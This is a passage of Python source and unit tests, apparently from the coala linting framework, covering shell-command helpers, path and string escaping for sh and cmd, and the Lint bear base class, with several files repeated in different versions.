    def test_run_interactive_shell_command_kwargs_delegation(self):
        with self.assertRaises(TypeError):
            with run_interactive_shell_command("some_command",
                                               weird_parameter=30):
                pass

        # Test one of the forbidden parameters.
        with self.assertRaises(TypeError):
            with run_interactive_shell_command("some_command", shell=False):                    
                pass

    def test_run_shell_command_without_stdin(self):
        command = RunShellCommandTest.construct_testscript_command(
            "test_program.py")

        stdout, stderr = run_shell_command(command)

        expected = ("test_program Z\n"
                    "non-interactive mode.\n"
                    "Exiting...\n")
        self.assertEqual(stdout, expected)
        self.assertEqual(stderr, "")

    def test_run_shell_command_with_stdin(self):
        command = RunShellCommandTest.construct_testscript_command(
            "test_input_program.py")

        stdout, stderr = run_shell_command(command, "1  4  10  22")

        self.assertEqual(stdout, "37\n")
        self.assertEqual(stderr, "")

        stdout, stderr = run_shell_command(command, "1 p 5")

        self.assertEqual(stdout, "")
        self.assertEqual(stderr, "INVALID INPUT\n")

    def test_run_shell_command_kwargs_delegation(self):
        with self.assertRaises(TypeError):
            run_shell_command("super-cool-command", weird_parameter2="abc")

        # Test one of the forbidden parameters.
        with self.assertRaises(TypeError):
            run_shell_command("super-cool-command", universal_newlines=False)


class PrepareStringArgumentTest(unittest.TestCase):

    def setUp(self):
        self.test_strings = ("normal_string",
                             "string with spaces",
                             'string with quotes"a',
                             "string with s-quotes'b",
                             "bsn \n A",
                             "unrecognized \\q escape")

    def test_prepare_string_argument_sh(self):
        expected_results = ('"normal_string"',
                            '"string with spaces"',
                            '"string with quotes\\"a"',
                            '"string with s-quotes\'b"',
                            '"bsn \n A"',
                            '"unrecognized \\q escape"')

        for string, result in zip(self.test_strings, expected_results):
            self.assertEqual(prepare_string_argument(string, "sh"),
                             result)

    def test_prepare_string_argument_unsupported(self):
        for string in self.test_strings:
            self.assertEqual(prepare_string_argument(string, "WeIrD_O/S"),
                             string)

from contextlib import contextmanager
from subprocess import PIPE, Popen

from coalib.parsing.StringProcessing import escape


@contextmanager
def run_interactive_shell_command(command, **kwargs):
    """
    Runs a command in shell and provides stdout, stderr and stdin streams.                    

    This function creates a context manager that sets up the process, returns                    
    to caller, closes streams and waits for process to exit on leaving.                    

    The process is opened in `universal_newlines` mode.                    

    :param command: The command to run on shell.                    
    :param kwargs:  Additional keyword arguments to pass to `subprocess.Popen`
                    that is used to spawn the process (except `shell`,                    
                    `stdout`, `stderr`, `stdin` and `universal_newlines`, a                    
                    `TypeError` is raised then).                    
    :return:        A context manager yielding the process started from the
                    command.
    """
    process = Popen(command,
                    shell=True,                    
                    stdout=PIPE,
                    stderr=PIPE,
                    stdin=PIPE,
                    universal_newlines=True,
                    **kwargs)
    try:
        yield process
    finally:
        process.stdout.close()
        process.stderr.close()
        process.stdin.close()
        process.wait()


def run_shell_command(command, stdin=None, **kwargs):
    """
    Runs a command in shell and returns the read stdout and stderr data.                    

    This function waits for the process to exit.                    

    :param command: The command to run on shell.                    
    :param stdin:   Initial input to send to the process.
    :param kwargs:  Additional keyword arguments to pass to `subprocess.Popen`
                    that is used to spawn the process (except `shell`,                    
                    `stdout`, `stderr`, `stdin` and `universal_newlines`, a                    
                    `TypeError` is raised then).                    
    :return:        A tuple with `(stdoutstring, stderrstring)`.
    """
    with run_interactive_shell_command(command, **kwargs) as p:
        ret = p.communicate(stdin)
    return ret


def get_shell_type():  # pragma: no cover
    """
    Finds the current shell type based on the outputs of common pre-defined
    variables in them. This is useful to identify which sort of escaping
    is required for strings.

    :return: The shell type. This can be either "powershell" if Windows
             Powershell is detected, "cmd" if command prompt is been
             detected or "sh" if it's neither of these.
    """
    out_hostname, _ = run_shell_command(["echo", "$host.name"])                    
    if out_hostname.strip() == "ConsoleHost":
        return "powershell"
    out_0, _ = run_shell_command(["echo", "$0"])                    
    if out_0.strip() == "" and out_0.strip() == "":
        return "cmd"
    return "sh"


def prepare_string_argument(string, shell=get_shell_type()):
    """
    Prepares a string argument for being passed as a parameter on shell.

    On `sh` this function effectively encloses the given string
    with quotes (either '' or "", depending on content).

    :param string: The string to prepare for shell.
    :param shell:  The shell platform to prepare string argument for.
                   If it is not "sh" it will be ignored and return the
                   given string without modification.
    :return:       The shell-prepared string.
    """
    if shell == "sh":
        return '"' + escape(string, '"') + '"'
    else:
        return string


def escape_path_argument(path, shell=get_shell_type()):
    """
    Makes a raw path ready for using as parameter in a shell command (escapes
    illegal characters, surrounds with quotes etc.).

    :param path:  The path to make ready for shell.
    :param shell: The shell platform to escape the path argument for. Possible
                  values are "sh", "powershell", and "cmd" (others will be
                  ignored and return the given path without modification).
    :return:      The escaped path argument.
    """
    if shell == "cmd":
        # If a quote (") occurs in path (which is illegal for NTFS file
        # systems, but maybe for others), escape it by preceding it with
        # a caret (^).
        return '"' + escape(path, '"', '^') + '"'
    elif shell == "sh":
        return escape(path, " ")
    else:
        # Any other non-supported system doesn't get a path escape.
        return path

import os
import unittest

from coalib.bearlib.abstractions.Lint import Lint
from coalib.misc.ContextManagers import prepare_file
from coalib.misc.Shell import escape_path_argument
from coalib.results.RESULT_SEVERITY import RESULT_SEVERITY
from coalib.results.SourceRange import SourceRange
from coalib.settings.Section import Section


class LintTest(unittest.TestCase):

    def setUp(self):
        section = Section("some_name")
        self.uut = Lint(section, None)

    def test_invalid_output(self):
        out = list(self.uut.process_output(
            ["1.0|0: Info message\n",
             "2.2|1: Normal message\n",
             "3.4|2: Major message\n"],
            "a/file.py",
            ['original_file_lines_placeholder']))
        self.assertEqual(len(out), 3)
        self.assertEqual(out[0].origin, "Lint")

        self.assertEqual(out[0].affected_code[0],
                         SourceRange.from_values("a/file.py", 1, 0))
        self.assertEqual(out[0].severity, RESULT_SEVERITY.INFO)
        self.assertEqual(out[0].message, "Info message")

        self.assertEqual(out[1].affected_code[0],
                         SourceRange.from_values("a/file.py", 2, 2))
        self.assertEqual(out[1].severity, RESULT_SEVERITY.NORMAL)
        self.assertEqual(out[1].message, "Normal message")

        self.assertEqual(out[2].affected_code[0],
                         SourceRange.from_values("a/file.py", 3, 4))
        self.assertEqual(out[2].severity, RESULT_SEVERITY.MAJOR)
        self.assertEqual(out[2].message, "Major message")

    def test_custom_regex(self):
        self.uut.output_regex = (r'(?P<origin>\w+)\|'
                                 r'(?P<line>\d+)\.(?P<column>\d+)\|'
                                 r'(?P<end_line>\d+)\.(?P<end_column>\d+)\|'
                                 r'(?P<severity>\w+): (?P<message>.*)')
        self.uut.severity_map = {"I": RESULT_SEVERITY.INFO}
        out = list(self.uut.process_output(
            ["info_msg|1.0|2.3|I: Info message\n"],
            'a/file.py',
            ['original_file_lines_placeholder']))
        self.assertEqual(len(out), 1)
        self.assertEqual(out[0].affected_code[0].start.line, 1)
        self.assertEqual(out[0].affected_code[0].start.column, 0)
        self.assertEqual(out[0].affected_code[0].end.line, 2)
        self.assertEqual(out[0].affected_code[0].end.column, 3)
        self.assertEqual(out[0].severity, RESULT_SEVERITY.INFO)
        self.assertEqual(out[0].origin, 'Lint (info_msg)')

    def test_valid_output(self):
        out = list(self.uut.process_output(
            ["Random line that shouldn't be captured\n",
             "*************\n"],
            'a/file.py',
            ['original_file_lines_placeholder']))
        self.assertEqual(len(out), 0)

    def test_stdin_input(self):
        with prepare_file(["abcd", "efgh"], None) as (lines, filename):
            # Use more which is a command that can take stdin and show it.
            # This is available in windows and unix.
            self.uut.executable = "more"                    
            self.uut.use_stdin = True
            self.uut.use_stderr = False
            self.uut.process_output = lambda output, filename, file: output

            out = self.uut.lint(file=lines)
            # Some implementations of `more` add an extra newline at the end.
            self.assertTrue(("abcd\n", "efgh\n") == out or
                            ("abcd\n", "efgh\n", "\n") == out)

    def test_stderr_output(self):
        self.uut.executable = "echo"
        self.uut.arguments = "hello"
        self.uut.use_stdin = False
        self.uut.use_stderr = True
        self.uut.process_output = lambda output, filename, file: output
        out = self.uut.lint("unused_filename")
        self.assertEqual((), out)  # stderr is used

        self.uut.use_stderr = False
        out = self.uut.lint("unused_filename")
        self.assertEqual(('hello\n',), out)  # stdout is used

        def assert_warn(line):
            assert line == "hello"
        old_warn = self.uut.warn
        self.uut.warn = assert_warn
        self.uut._print_errors(["hello", "\n"])
        self.uut.warn = old_warn

    def test_gives_corrected(self):
        self.uut.gives_corrected = True
        out = tuple(self.uut.process_output(["a", "b"], "filename", ["a", "b"]))
        self.assertEqual((), out)
        out = tuple(self.uut.process_output(["a", "b"], "filename", ["a"]))
        self.assertEqual(len(out), 1)

    def test_missing_binary(self):
        old_binary = Lint.executable
        invalid_binary = "invalid_binary_which_doesnt_exist"
        Lint.executable = invalid_binary

        self.assertEqual(Lint.check_prerequisites(),
                         "'{}' is not installed.".format(invalid_binary))

        # "echo" is existent on nearly all platforms.
        Lint.executable = "echo"
        self.assertTrue(Lint.check_prerequisites())

        del Lint.executable
        self.assertTrue(Lint.check_prerequisites())

        Lint.executable = old_binary

    def test_config_file_generator(self):
        self.uut.executable = "echo"
        self.uut.arguments = "-c {config_file}"

        self.assertEqual(
            self.uut._create_command(config_file="configfile").strip(),
            "echo -c " + escape_path_argument("configfile"))

    def test_config_file_generator(self):
        self.uut.executable = "echo"
        self.uut.config_file = lambda: ["config line1"]
        config_filename = self.uut.generate_config_file()
        self.assertTrue(os.path.isfile(config_filename))
        os.remove(config_filename)

        # To complete coverage of closing the config file and check if any
        # errors are thrown there.
        self.uut.lint("filename")

import os
import sys
import unittest

from coalib.misc.Shell import (
    escape_path_argument, prepare_string_argument,
    run_interactive_shell_command, run_shell_command)


class EscapePathArgumentTest(unittest.TestCase):

    def test_escape_path_argument_sh(self):
        _type = "sh"
        self.assertEqual(
            escape_path_argument("/home/usr/a-file", _type),
            "/home/usr/a-file")
        self.assertEqual(
            escape_path_argument("/home/usr/a-dir/", _type),
            "/home/usr/a-dir/")
        self.assertEqual(
            escape_path_argument("/home/us r/a-file with spaces.bla",
                                 _type),
            "/home/us\\ r/a-file\\ with\\ spaces.bla")
        self.assertEqual(
            escape_path_argument("/home/us r/a-dir with spaces/x/",
                                 _type),
            "/home/us\\ r/a-dir\\ with\\ spaces/x/")
        self.assertEqual(
            escape_path_argument(
                "relative something/with cherries and/pickles.delicious",
                _type),
            "relative\\ something/with\\ cherries\\ and/pickles.delicious")

    def test_escape_path_argument_cmd(self):
        _type = "cmd"
        self.assertEqual(
            escape_path_argument("C:\\Windows\\has-a-weird-shell.txt", _type),
            "\"C:\\Windows\\has-a-weird-shell.txt\"")
        self.assertEqual(
            escape_path_argument("C:\\Windows\\lolrofl\\dirs\\", _type),
            "\"C:\\Windows\\lolrofl\\dirs\\\"")
        self.assertEqual(
            escape_path_argument("X:\\Users\\Maito Gai\\fi le.exe", _type),
            "\"X:\\Users\\Maito Gai\\fi le.exe\"")
        self.assertEqual(
            escape_path_argument("X:\\Users\\Mai to Gai\\director y\\",
                                 _type),
            "\"X:\\Users\\Mai to Gai\\director y\\\"")
        self.assertEqual(
            escape_path_argument("X:\\Users\\Maito Gai\\\"seven-gates\".y",
                                 _type),
            "\"X:\\Users\\Maito Gai\\^\"seven-gates^\".y\"")
        self.assertEqual(
            escape_path_argument("System32\\my-custom relative tool\\",
                                 _type),
            "\"System32\\my-custom relative tool\\\"")
        self.assertEqual(
            escape_path_argument("System32\\illegal\" name \"\".curd", _type),
            "\"System32\\illegal^\" name ^\"^\".curd\"")

    def test_escape_path_argument_unsupported(self):
        _type = "INVALID"
        self.assertEqual(
            escape_path_argument("/home/usr/a-file", _type),
            "/home/usr/a-file")
        self.assertEqual(
            escape_path_argument("/home/us r/a-file with spaces.bla", _type),
            "/home/us r/a-file with spaces.bla")
        self.assertEqual(
            escape_path_argument("|home|us r|a*dir with spaces|x|", _type),
            "|home|us r|a*dir with spaces|x|")
        self.assertEqual(
            escape_path_argument("system|a|b|c?d", _type),
            "system|a|b|c?d")


class RunShellCommandTest(unittest.TestCase):

    @staticmethod
    def construct_testscript_command(scriptname):
        return " ".join(                    
            escape_path_argument(s) for s in (
                sys.executable,                    
                os.path.join(os.path.dirname(os.path.realpath(__file__)),
                             "run_shell_command_testfiles",
                             scriptname)))                    

    def test_run_interactive_shell_command(self):
        command = RunShellCommandTest.construct_testscript_command(
            "test_interactive_program.py")

        with run_interactive_shell_command(command) as p:
            self.assertEqual(p.stdout.readline(), "test_program X\n")
            self.assertEqual(p.stdout.readline(), "Type in a number:\n")
            p.stdin.write("33\n")
            p.stdin.flush()
            self.assertEqual(p.stdout.readline(), "33\n")
            self.assertEqual(p.stdout.readline(), "Exiting program.\n")

    def test_run_interactive_shell_command_kwargs_delegation(self):
        with self.assertRaises(TypeError):
            with run_interactive_shell_command("some_command",
                                               weird_parameter=30):
                pass

        # Test one of the forbidden parameters.
        with self.assertRaises(TypeError):
            with run_interactive_shell_command("some_command", shell=False):                    
                pass

    def test_run_shell_command_without_stdin(self):
        command = RunShellCommandTest.construct_testscript_command(
            "test_program.py")

        stdout, stderr = run_shell_command(command)

        expected = ("test_program Z\n"
                    "non-interactive mode.\n"
                    "Exiting...\n")
        self.assertEqual(stdout, expected)
        self.assertEqual(stderr, "")

    def test_run_shell_command_with_stdin(self):
        command = RunShellCommandTest.construct_testscript_command(
            "test_input_program.py")

        stdout, stderr = run_shell_command(command, "1  4  10  22")

        self.assertEqual(stdout, "37\n")
        self.assertEqual(stderr, "")

        stdout, stderr = run_shell_command(command, "1 p 5")

        self.assertEqual(stdout, "")
        self.assertEqual(stderr, "INVALID INPUT\n")

    def test_run_shell_command_kwargs_delegation(self):
        with self.assertRaises(TypeError):
            run_shell_command("super-cool-command", weird_parameter2="abc")

        # Test one of the forbidden parameters.
        with self.assertRaises(TypeError):
            run_shell_command("super-cool-command", universal_newlines=False)


class PrepareStringArgumentTest(unittest.TestCase):

    def setUp(self):
        self.test_strings = ("normal_string",
                             "string with spaces",
                             'string with quotes"a',
                             "string with s-quotes'b",
                             "bsn \n A",
                             "unrecognized \\q escape")

    def test_prepare_string_argument_sh(self):
        expected_results = ('"normal_string"',
                            '"string with spaces"',
                            '"string with quotes\\"a"',
                            '"string with s-quotes\'b"',
                            '"bsn \n A"',
                            '"unrecognized \\q escape"')

        for string, result in zip(self.test_strings, expected_results):
            self.assertEqual(prepare_string_argument(string, "sh"),
                             result)

    def test_prepare_string_argument_unsupported(self):
        for string in self.test_strings:
            self.assertEqual(prepare_string_argument(string, "WeIrD_O/S"),
                             string)

import os
import re
import shutil
from subprocess import check_call, CalledProcessError, DEVNULL
import tempfile

from coalib.bears.Bear import Bear
from coalib.misc.Decorators import enforce_signature
from coalib.misc.Shell import escape_path_argument, run_shell_command
from coalib.results.Diff import Diff
from coalib.results.Result import Result
from coalib.results.RESULT_SEVERITY import RESULT_SEVERITY


class Lint(Bear):

    """
    Deals with the creation of linting bears.

    For the tutorial see:
    http://coala.readthedocs.org/en/latest/Users/Tutorials/Linter_Bears.html

    :param executable:                  The executable to run the linter.
    :param prerequisite_command:        The command to run as a prerequisite
                                        and is of type ``list``.
    :param prerequisites_fail_msg:      The message to be displayed if the
                                        prerequisite fails.
    :param arguments:                   The arguments to supply to the linter,
                                        such that the file name to be analyzed
                                        can be appended to the end. Note that
                                        we use ``.format()`` on the arguments -
                                        so, ``{abc}`` needs to be given as
                                        ``{{abc}}``. Currently, the following
                                        will be replaced:

                                         - ``{filename}`` - The filename passed
                                           to ``lint()``
                                         - ``{config_file}`` - The config file
                                           created using ``config_file()``

    :param output_regex:    The regex which will match the output of the linter
                            to get results. This is not used if
                            ``gives_corrected`` is set. This regex should give
                            out the following variables:

                             - line - The line where the issue starts.
                             - column - The column where the issue starts.
                             - end_line - The line where the issue ends.
                             - end_column - The column where the issue ends.
                             - severity - The severity of the issue.
                             - message - The message of the result.
                             - origin - The origin of the issue.

    :param diff_severity:   The severity to use for all results if
                            ``gives_corrected`` is set.
    :param diff_message:    The message to use for all results if
                            ``gives_corrected`` is set.
    :param use_stderr:      Uses stderr as the output stream is it's True.
    :param use_stdin:       Sends file as stdin instead of giving the file name.
    :param gives_corrected: True if the executable gives the corrected file
                            or just the issues.
    :param severity_map:    A dict where the keys are the possible severity
                            values the Linter gives out and the values are the
                            severity of the coala Result to set it to. If it is
                            not a dict, it is ignored.
    """
    executable = None
    prerequisite_command = None
    prerequisite_fail_msg = 'Unknown failure.'
    arguments = ""
    output_regex = re.compile(r'(?P<line>\d+)\.(?P<column>\d+)\|'
                              r'(?P<severity>\d+): (?P<message>.*)')
    diff_message = 'No result message was set'
    diff_severity = RESULT_SEVERITY.NORMAL
    use_stderr = False
    use_stdin = False
    gives_corrected = False
    severity_map = None

    def lint(self, filename=None, file=None):
        """
        Takes a file and lints it using the linter variables defined apriori.

        :param filename:  The name of the file to execute.
        :param file:      The contents of the file as a list of strings.
        """
        assert ((self.use_stdin and file is not None) or
                (not self.use_stdin and filename is not None))

        config_file = self.generate_config_file()
        self.command = self._create_command(filename=filename,
                                            config_file=config_file)

        stdin_input = "".join(file) if self.use_stdin else None
        stdout_output, stderr_output = run_shell_command(self.command,
                                                         stdin=stdin_input)                    
        self.stdout_output = tuple(stdout_output.splitlines(keepends=True))
        self.stderr_output = tuple(stderr_output.splitlines(keepends=True))
        results_output = (self.stderr_output if self.use_stderr
                          else self.stdout_output)
        results = self.process_output(results_output, filename, file)
        if not self.use_stderr:
            self._print_errors(self.stderr_output)

        if config_file:
            os.remove(config_file)

        return results

    def process_output(self, output, filename, file):
        """
        Take the output (from stdout or stderr) and use it to create Results.
        If the class variable ``gives_corrected`` is set to True, the
        ``_process_corrected()`` is called. If it is False,
        ``_process_issues()`` is called.

        :param output:   The output to be used to obtain Results from. The
                         output is either stdout or stderr depending on the
                         class variable ``use_stderr``.
        :param filename: The name of the file whose output is being processed.
        :param file:     The contents of the file whose output is being
                         processed.
        :return:         Generator which gives Results produced based on this
                         output.
        """
        if self.gives_corrected:
            return self._process_corrected(output, filename, file)
        else:
            return self._process_issues(output, filename)

    def _process_corrected(self, output, filename, file):
        """
        Process the output and use it to create Results by creating diffs.
        The diffs are created by comparing the output and the original file.

        :param output:   The corrected file contents.
        :param filename: The name of the file.
        :param file:     The original contents of the file.
        :return:         Generator which gives Results produced based on the
                         diffs created by comparing the original and corrected
                         contents.
        """
        for diff in self.__yield_diffs(file, output):
            yield Result(self,
                         self.diff_message,
                         affected_code=(diff.range(filename),),
                         diffs={filename: diff},
                         severity=self.diff_severity)

    def _process_issues(self, output, filename):
        """
        Process the output using the regex provided in ``output_regex`` and
        use it to create Results by using named captured groups from the regex.

        :param output:   The output to be parsed by regex.
        :param filename: The name of the file.
        :param file:     The original contents of the file.
        :return:         Generator which gives Results produced based on regex
                         matches using the ``output_regex`` provided and the
                         ``output`` parameter.
        """
        regex = self.output_regex
        if isinstance(regex, str):
            regex = regex % {"file_name": filename}

        # Note: We join ``output`` because the regex may want to capture
        #       multiple lines also.
        for match in re.finditer(regex, "".join(output)):
            yield self.match_to_result(match, filename)

    def _get_groupdict(self, match):
        """
        Convert a regex match's groups into a dictionary with data to be used
        to create a Result. This is used internally in ``match_to_result``.

        :param match:    The match got from regex parsing.
        :param filename: The name of the file from which this match is got.
        :return:         The dictionary containing the information:
                         - line - The line where the result starts.
                         - column - The column where the result starts.
                         - end_line - The line where the result ends.
                         - end_column - The column where the result ends.
                         - severity - The severity of the result.
                         - message - The message of the result.
                         - origin - The origin of the result.
        """
        groups = match.groupdict()
        if (
                isinstance(self.severity_map, dict) and
                "severity" in groups and
                groups["severity"] in self.severity_map):
            groups["severity"] = self.severity_map[groups["severity"]]
        return groups

    def _create_command(self, **kwargs):
        command = self.executable + ' ' + self.arguments
        for key in ("filename", "config_file"):
            kwargs[key] = escape_path_argument(kwargs.get(key, "") or "")
        return command.format(**kwargs)

    def _print_errors(self, errors):
        for line in filter(lambda error: bool(error.strip()), errors):
            self.warn(line)

    @staticmethod
    def __yield_diffs(file, new_file):
        if tuple(new_file) != tuple(file):
            wholediff = Diff.from_string_arrays(file, new_file)

            for diff in wholediff.split_diff():
                yield diff

    def match_to_result(self, match, filename):
        """
        Convert a regex match's groups into a coala Result object.

        :param match:    The match got from regex parsing.
        :param filename: The name of the file from which this match is got.
        :return:         The Result object.
        """
        groups = self._get_groupdict(match)

        # Pre process the groups
        for variable in ("line", "column", "end_line", "end_column"):
            if variable in groups and groups[variable]:
                groups[variable] = int(groups[variable])

        if "origin" in groups:
            groups['origin'] = "{} ({})".format(str(self.__class__.__name__),
                                                str(groups["origin"]))

        return Result.from_values(
            origin=groups.get("origin", self),
            message=groups.get("message", ""),
            file=filename,
            severity=int(groups.get("severity", RESULT_SEVERITY.NORMAL)),
            line=groups.get("line", None),
            column=groups.get("column", None),
            end_line=groups.get("end_line", None),
            end_column=groups.get("end_column", None))

    @classmethod
    def check_prerequisites(cls):
        """
        Checks for prerequisites required by the Linter Bear.

        It uses the class variables:
        -  ``executable`` - Checks that it is available in the PATH using
        ``shutil.which``.
        -  ``prerequisite_command`` - Checks that when this command is run,
        the exitcode is 0. If it is not zero, ``prerequisite_fail_msg``
        is gives as the failure message.

        If either of them is set to ``None`` that check is ignored.

        :return: True is all checks are valid, else False.
        """
        return cls._check_executable_command(
            executable=cls.executable,
            command=cls.prerequisite_command,
            fail_msg=cls.prerequisite_fail_msg)

    @classmethod
    @enforce_signature
    def _check_executable_command(cls, executable,
                                  command: (list, tuple, None), fail_msg):
        """
        Checks whether the required executable is found and the
        required command succesfully executes.

        The function is intended be used with classes having an
        executable, prerequisite_command and prerequisite_fail_msg.

        :param executable:   The executable to check for.
        :param command:      The command to check as a prerequisite.
        :param fail_msg:     The fail message to display when the
                             command doesn't return an exitcode of zero.

        :return: True if command successfully executes, or is not required.
                 not True otherwise, with a string containing a
                 detailed description of the error.
        """
        if cls._check_executable(executable):
            if command is None:
                return True  # when there are no prerequisites
            try:
                check_call(command, stdout=DEVNULL, stderr=DEVNULL)
                return True
            except (OSError, CalledProcessError):
                return fail_msg
        else:
            return repr(executable) + " is not installed."

    @staticmethod
    def _check_executable(executable):
        """
        Checks whether the needed executable is present in the system.

        :param executable: The executable to check for.

        :return: True if binary is present, or is not required.
                 not True otherwise, with a string containing a
                 detailed description of what's missing.
        """
        if executable is None:
            return True
        return shutil.which(executable) is not None

    def generate_config_file(self):
        """
        Generates a temporary config file.
        Note: The user of the function is responsible for deleting the
        tempfile when done with it.

        :return: The file name of the tempfile created.
        """
        config_lines = self.config_file()
        config_file = ""
        if config_lines is not None:
            for i, line in enumerate(config_lines):
                config_lines[i] = line if line.endswith("\n") else line + "\n"
            config_fd, config_file = tempfile.mkstemp()
            os.close(config_fd)
            with open(config_file, 'w') as conf_file:
                conf_file.writelines(config_lines)
        return config_file

    @staticmethod
    def config_file():
        """
        Returns a configuation file from the section given to the bear.
        The section is available in ``self.section``. To add the config
        file's name generated by this function to the arguments,
        use ``{config_file}``.

        :return: A list of lines of the config file to be used or None.
        """
        return None

from contextlib import contextmanager
from subprocess import PIPE, Popen

from coalib.parsing.StringProcessing import escape


@contextmanager
def run_interactive_shell_command(command, **kwargs):
    """
    Runs a command in shell and provides stdout, stderr and stdin streams.                    

    This function creates a context manager that sets up the process, returns                    
    to caller, closes streams and waits for process to exit on leaving.                    

    The process is opened in ``universal_newlines`` mode.                    

    :param command: The command to run on shell.                    
    :param kwargs:  Additional keyword arguments to pass to ``subprocess.Popen``                    
                    that is used to spawn the process (except ``shell``,                    
                    ``stdout``, ``stderr``, ``stdin`` and                    
                    ``universal_newlines``, a ``TypeError`` is raised then).
    :return:        A context manager yielding the process started from the
                    command.
    """
    process = Popen(command,
                    shell=True,                    
                    stdout=PIPE,
                    stderr=PIPE,
                    stdin=PIPE,
                    universal_newlines=True,
                    **kwargs)
    try:
        yield process
    finally:
        process.stdout.close()
        process.stderr.close()
        process.stdin.close()
        process.wait()


def run_shell_command(command, stdin=None, **kwargs):
    """
    Runs a command in shell and returns the read stdout and stderr data.                    

    This function waits for the process to exit.                    

    :param command: The command to run on shell.                    
    :param stdin:   Initial input to send to the process.
    :param kwargs:  Additional keyword arguments to pass to ``subprocess.Popen``                    
                    that is used to spawn the process (except ``shell``,                    
                    ``stdout``, ``stderr``, ``stdin`` and                    
                    ``universal_newlines``, a ``TypeError`` is raised then).
    :return:        A tuple with ``(stdoutstring, stderrstring)``.
    """
    with run_interactive_shell_command(command, **kwargs) as p:
        ret = p.communicate(stdin)
    return ret


def get_shell_type():  # pragma: no cover
    """
    Finds the current shell type based on the outputs of common pre-defined
    variables in them. This is useful to identify which sort of escaping
    is required for strings.

    :return: The shell type. This can be either "powershell" if Windows
             Powershell is detected, "cmd" if command prompt is been
             detected or "sh" if it's neither of these.
    """
    out = run_shell_command("echo $host.name")[0]                    
    if out.strip() == "ConsoleHost":
        return "powershell"
    out = run_shell_command("echo $0")[0]                    
    if out.strip() == "$0":
        return "cmd"
    return "sh"


def prepare_string_argument(string, shell=get_shell_type()):
    """
    Prepares a string argument for being passed as a parameter on shell.

    On ``sh`` this function effectively encloses the given string
    with quotes (either '' or "", depending on content).

    :param string: The string to prepare for shell.
    :param shell:  The shell platform to prepare string argument for.
                   If it is not "sh" it will be ignored and return the
                   given string without modification.
    :return:       The shell-prepared string.
    """
    if shell == "sh":
        return '"' + escape(string, '"') + '"'
    else:
        return string


def escape_path_argument(path, shell=get_shell_type()):
    """
    Makes a raw path ready for using as parameter in a shell command (escapes
    illegal characters, surrounds with quotes etc.).

    :param path:  The path to make ready for shell.
    :param shell: The shell platform to escape the path argument for. Possible
                  values are "sh", "powershell", and "cmd" (others will be
                  ignored and return the given path without modification).
    :return:      The escaped path argument.
    """
    if shell == "cmd":
        # If a quote (") occurs in path (which is illegal for NTFS file
        # systems, but maybe for others), escape it by preceding it with
        # a caret (^).
        return '"' + escape(path, '"', '^') + '"'
    elif shell == "sh":
        return escape(path, " ")
    else:
        # Any other non-supported system doesn't get a path escape.
        return path

import os
import sys
import unittest

from coalib.misc.Shell import (
    escape_path_argument, prepare_string_argument,
    run_interactive_shell_command, run_shell_command)


class EscapePathArgumentTest(unittest.TestCase):

    def test_escape_path_argument_sh(self):
        _type = "sh"
        self.assertEqual(
            escape_path_argument("/home/usr/a-file", _type),
            "/home/usr/a-file")
        self.assertEqual(
            escape_path_argument("/home/usr/a-dir/", _type),
            "/home/usr/a-dir/")
        self.assertEqual(
            escape_path_argument("/home/us r/a-file with spaces.bla",
                                 _type),
            "/home/us\\ r/a-file\\ with\\ spaces.bla")
        self.assertEqual(
            escape_path_argument("/home/us r/a-dir with spaces/x/",
                                 _type),
            "/home/us\\ r/a-dir\\ with\\ spaces/x/")
        self.assertEqual(
            escape_path_argument(
                "relative something/with cherries and/pickles.delicious",
                _type),
            "relative\\ something/with\\ cherries\\ and/pickles.delicious")

    def test_escape_path_argument_cmd(self):
        _type = "cmd"
        self.assertEqual(
            escape_path_argument("C:\\Windows\\has-a-weird-shell.txt", _type),
            "\"C:\\Windows\\has-a-weird-shell.txt\"")
        self.assertEqual(
            escape_path_argument("C:\\Windows\\lolrofl\\dirs\\", _type),
            "\"C:\\Windows\\lolrofl\\dirs\\\"")
        self.assertEqual(
            escape_path_argument("X:\\Users\\Maito Gai\\fi le.exe", _type),
            "\"X:\\Users\\Maito Gai\\fi le.exe\"")
        self.assertEqual(
            escape_path_argument("X:\\Users\\Mai to Gai\\director y\\",
                                 _type),
            "\"X:\\Users\\Mai to Gai\\director y\\\"")
        self.assertEqual(
            escape_path_argument("X:\\Users\\Maito Gai\\\"seven-gates\".y",
                                 _type),
            "\"X:\\Users\\Maito Gai\\^\"seven-gates^\".y\"")
        self.assertEqual(
            escape_path_argument("System32\\my-custom relative tool\\",
                                 _type),
            "\"System32\\my-custom relative tool\\\"")
        self.assertEqual(
            escape_path_argument("System32\\illegal\" name \"\".curd", _type),
            "\"System32\\illegal^\" name ^\"^\".curd\"")

    def test_escape_path_argument_unsupported(self):
        _type = "INVALID"
        self.assertEqual(
            escape_path_argument("/home/usr/a-file", _type),
            "/home/usr/a-file")
        self.assertEqual(
            escape_path_argument("/home/us r/a-file with spaces.bla", _type),
            "/home/us r/a-file with spaces.bla")
        self.assertEqual(
            escape_path_argument("|home|us r|a*dir with spaces|x|", _type),
            "|home|us r|a*dir with spaces|x|")
        self.assertEqual(
            escape_path_argument("system|a|b|c?d", _type),
            "system|a|b|c?d")


class RunShellCommandTest(unittest.TestCase):

    @staticmethod
    def construct_testscript_command(scriptname):
        return " ".join(                    
            escape_path_argument(s) for s in (
                sys.executable,                    
                os.path.join(os.path.dirname(os.path.realpath(__file__)),
                             "run_shell_command_testfiles",
                             scriptname)))                    

    def test_run_interactive_shell_command(self):
        command = RunShellCommandTest.construct_testscript_command(
            "test_interactive_program.py")

        with run_interactive_shell_command(command) as p:
            self.assertEqual(p.stdout.readline(), "test_program X\n")
            self.assertEqual(p.stdout.readline(), "Type in a number:\n")
            p.stdin.write("33\n")
            p.stdin.flush()
            self.assertEqual(p.stdout.readline(), "33\n")
            self.assertEqual(p.stdout.readline(), "Exiting program.\n")

    def test_run_interactive_shell_command_kwargs_delegation(self):
        with self.assertRaises(TypeError):
            with run_interactive_shell_command("some_command",
                                               weird_parameter=30):
                pass

        # Test one of the forbidden parameters.
        with self.assertRaises(TypeError):
            with run_interactive_shell_command("some_command", shell=False):                    
                pass

    def test_run_shell_command_without_stdin(self):
        command = RunShellCommandTest.construct_testscript_command(
            "test_program.py")

        stdout, stderr = run_shell_command(command)

        expected = ("test_program Z\n"
                    "non-interactive mode.\n"
                    "Exiting...\n")
        self.assertEqual(stdout, expected)
        self.assertEqual(stderr, "")

    def test_run_shell_command_with_stdin(self):
        command = RunShellCommandTest.construct_testscript_command(
            "test_input_program.py")

        stdout, stderr = run_shell_command(command, "1  4  10  22")

        self.assertEqual(stdout, "37\n")
        self.assertEqual(stderr, "")

